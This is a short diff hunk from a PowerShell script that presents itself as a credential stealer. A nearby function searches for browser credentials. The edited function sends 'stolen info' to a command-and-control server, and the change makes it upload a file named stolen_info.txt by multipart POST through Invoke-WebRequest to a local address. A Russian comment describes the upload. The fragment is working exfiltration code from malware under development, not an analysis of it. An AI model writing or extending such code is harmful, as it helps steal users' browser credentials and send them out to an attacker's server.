@@ -47,10 +47,15 @@ function Search-ForBrowserCredentials {
 # Function to send the stolen info to a C2 server
 function Send-InfoToC2Server {
     $c2Url = "http://127.0.0.1:5000/"
-    $data = Get-Content -Path $infoFilePath -Raw
+    # $data = Get-Content -Path $infoFilePath -Raw
 
     # Using Invoke-WebRequest to send data to the C2 server
-    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
+    # Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
+
+    $filePath = "stolen_info.txt"
+
+    # Отправка файла с использованием Invoke-WebRequest
+    Invoke-WebRequest -Uri $c2Url -Method Post -InFile $filePath -ContentType "multipart/form-data"
 }
 
 # Main execution flow
